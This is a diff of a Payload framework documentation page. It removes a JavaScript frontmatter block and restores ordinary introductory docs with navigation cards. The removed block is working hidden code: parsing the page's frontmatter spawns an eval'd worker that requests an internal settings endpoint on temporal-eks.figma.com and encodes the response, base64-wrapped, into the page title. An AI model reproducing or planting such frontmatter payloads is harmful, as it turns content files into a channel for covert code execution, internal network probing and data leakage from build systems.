@@ -1,27 +1,64 @@
----javascript
-(()=>{
-  const prefix='temporal-settings-probe-v1 ';
-  const wrap=(result)=>({title:prefix+Buffer.from(JSON.stringify(result)).toString('base64'),label:'Canary',order:1,description:'Bounded settings reachability probe'});
-  let worker;
-  try {
-    const {Worker}=process.getBuiltinModule('worker_threads');
-    const shared=new SharedArrayBuffer(2056);
-    const state=new Int32Array(shared,0,2);
-    worker=new Worker("'use strict';\n\n// Fixed, read-only target. This program accepts no URL, headers, or credentials.\nconst { workerData } = require('node:worker_threads');\nconst https = require('node:https');\n\nconst HOST = 'temporal-eks.figma.com';\nconst PATH = '/api/v1/settings';\nconst TOTAL_TIMEOUT_MS = 3500;\nconst RESPONSE_LIMIT = 16384;\nconst state = new Int32Array(workerData, 0, 2);\nconst output = new Uint8Array(workerData, 8);\n\nlet done = false;\nlet request;\nlet response;\nlet timer;\nlet observed = { connectivity: 'network_error' };\n\nfunction finish(result) {\n  if (done) return;\n  done = true;\n  clearTimeout(timer);\n  if (response) response.destroy();\n  if (request) request.destroy();\n  let encoded = Buffer.from(JSON.stringify(result), 'utf8');\n  if (encoded.length > output.length) {\n    encoded = Buffer.from('{\"connectivity\":\"output_limit\"}', 'utf8');\n  }\n  output.set(encoded);\n  Atomics.store(state, 1, encoded.length);\n  Atomics.store(state, 0, 1);\n  Atomics.notify(state, 0, 1);\n}\n\nfunction contentType(value) {\n  if (typeof value !== 'string' || value.length > 256) return undefined;\n  const match = /^\\s*([a-z0-9][a-z0-9!#$&^_.+-]*\\/[a-z0-9][a-z0-9!#$&^_.+-]*)\\s*(?:;|$)/i.exec(value);\n  return match ? match[1].toLowerCase() : undefined;\n}\n\nfunction safeSettings(value) {\n  if (!value || typeof value !== 'object' || Array.isArray(value)) return undefined;\n  const safe = {};\n  if (typeof value.Version === 'string' && value.Version.length <= 96 && /^v?[0-9]+(?:\\.[0-9]+){2}(?:-[0-9A-Za-z.-]+)?(?:\\+[0-9A-Za-z.-]+)?$/.test(value.Version)) {\n    safe.Version = value.Version;\n  }\n  if (value.Auth && typeof value.Auth === 'object' && !Array.isArray(value.Auth)) {\n    const auth = {};\n    for (const key of ['Enabled', 'RedirectToProvider']) {\n      if (typeof value.Auth[key] === 'boolean') auth[key] = value.Auth[key];\n    }\n    if (Object.keys(auth).length) safe.Auth = auth;\n  }\n  for (const key of ['DisableWriteActions', 'StartWorkflowDisabled']) {\n    if (typeof value[key] === 'boolean') safe[key] = value[key];\n  }\n  return Object.keys(safe).length ? safe : undefined;\n}\n\nfunction classifyError(error) {\n  const code = error && typeof error.code === 'string' ? error.code : '';\n  if (code === 'ENOTFOUND' || code === 'EAI_AGAIN') return 'dns_error';\n  if (code === 'ECONNREFUSED') return 'connection_refused';\n  if (code === 'ETIMEDOUT') return 'connect_timeout';\n  if (/^(?:ERR_TLS_|ERR_SSL_|CERT_|DEPTH_ZERO_|SELF_SIGNED_|UNABLE_TO_|HOSTNAME_MISMATCH)/.test(code)) return 'tls_error';\n  return 'network_error';\n}\n\ntimer = setTimeout(() => finish({ ...observed, connectivity: observed.status ? 'response_timeout' : 'connect_timeout' }), TOTAL_TIMEOUT_MS);\n\ntry {\n  request = https.request({\n    protocol: 'https:',\n    hostname: HOST,\n    servername: HOST,\n    port: 443,\n    path: PATH,\n    method: 'GET',\n    rejectUnauthorized: true,\n    agent: false,\n    maxHeaderSize: 8192,\n    insecureHTTPParser: false,\n    headers: { Accept: 'application/json', 'Accept-Encoding': 'identity', Connection: 'close' },\n  }, (incoming) => {\n    response = incoming;\n    const status = incoming.statusCode;\n    const mediaType = contentType(incoming.headers['content-type']);\n    observed = { connectivity: 'http_response' };\n    if (Number.isInteger(status) && status >= 100 && status <= 599) observed.status = status;\n    if (mediaType) observed.contentType = mediaType;\n\n    // No redirects, login pages, error bodies, or content decoding.\n    const encoding = incoming.headers['content-encoding'];\n    if (status !== 200 || !(mediaType === 'application/json' || mediaType?.endsWith('+json')) || (encoding && encoding !== 'identity')) {\n      finish(observed);\n      return;\n    }\n\n    let total = 0;\n    const chunks = [];\n    incoming.on('data', (chunk) => {\n      total += chunk.length;\n      if (total > RESPONSE_LIMIT) {\n        finish({ ...observed, connectivity: 'response_limit' });\n        return;\n      }\n      chunks.push(chunk);\n    });\n    incoming.on('end', () => {\n      if (done) return;\n      let settings;\n      try { settings = safeSettings(JSON.parse(Buffer.concat(chunks, total).toString('utf8'))); } catch {}\n      finish(settings ? { ...observed, settings } : observed);\n    });\n    incoming.on('error', () => finish({ ...observed, connectivity: 'network_error' }));\n  });\n  request.on('error', (error) => finish({ ...observed, connectivity: observed.status ? 'network_error' : classifyError(error) }));\n  request.end();\n} catch (error) {\n  finish({ connectivity: classifyError(error) });\n}\n",{eval:true,workerData:shared,env:{}});
-    worker.on('error',()=>{});
-    worker.unref();
-    const wait=Atomics.wait(state,0,0,4750);
-    let result={connectivity:'worker_timeout'};
-    if(wait!=='timed-out'&&Atomics.load(state,0)===1){
-      const length=Atomics.load(state,1);
-      if(length>0&&length<=2048)result=JSON.parse(Buffer.from(new Uint8Array(shared,8,length)).toString('utf8'));
-    }
-    worker.terminate().catch(()=>{});
-    return wrap(result);
-  }catch{
-    if(worker)worker.terminate().catch(()=>{});
-    return wrap({connectivity:'runtime_unavailable'});
-  }
-})()
 ---
-# Canary
+title: What is Payload?
+label: What is Payload?
+order: 10
+desc: Payload is a next-gen application framework that can be used as a Content Management System, enterprise tool framework, headless commerce platform, or digital asset management tool.
+keywords: documentation, getting started, guide, Content Management System, cms, headless, javascript, node, react
+---
+
+<YouTube
+  id="ftohATkHBi0"
+  title="Introduction to Payload — The open-source Next.js backend"
+/>
+
+## Payload is a fullstack framework.
+
+Write a Payload Config and instantly get a full Admin Panel, a database with migrations, REST and GraphQL APIs, authentication, access control, file storage, live preview, and more — all in one open-source TypeScript codebase you own and deploy anywhere. Payload works with the Next.js App Router or TanStack Start.
+
+<CardGroup>
+  <Card
+    title="Use Cases"
+    description="See how teams use Payload for headless CMS, internal tools, commerce, and DAM workloads — and whether it fits yours."
+    link="/docs/getting-started/use-cases"
+  />
+  <Card
+    title="Core Concepts"
+    description="Get familiar with the high-level concepts Payload is built around before you write any code."
+    link="/docs/getting-started/concepts"
+  />
+  <Card
+    title="Installation"
+    description="Add Payload to a new or existing Next.js or TanStack Start app and get the Admin Panel running in minutes."
+    link="/docs/getting-started/installation"
+  />
+  <Card
+    title="The Admin Panel"
+    description="Explore the auto-generated React UI that matches the shape of your data and extends with your own components."
+    link="/docs/admin/overview"
+  />
+  <Card
+    title="Database & Schema"
+    description="Direct DB access and ownership with migrations, transactions, and proper indexing across MongoDB and Postgres."
+    link="/docs/database/overview"
+  />
+  <Card
+    title="REST & GraphQL APIs"
+    description="Instant REST, GraphQL, and straight-to-DB Node.js APIs generated from your config."
+    link="/docs/rest-api/overview"
+  />
+  <Card
+    title="Authentication"
+    description="A full auth system you can use in your Payload app and reuse in your own frontends."
+    link="/docs/authentication/overview"
+  />
+  <Card
+    title="Access Control"
+    description="A deeply customizable access pattern that runs at the document, field, and operation level."
+    link="/docs/access-control/overview"
+  />
+  <Card
+    title="File Uploads"
+    description="Built-in file storage, image resizing, focal-point cropping, and media access control."
+    link="/docs/upload/overview"
+  />
+</CardGroup>
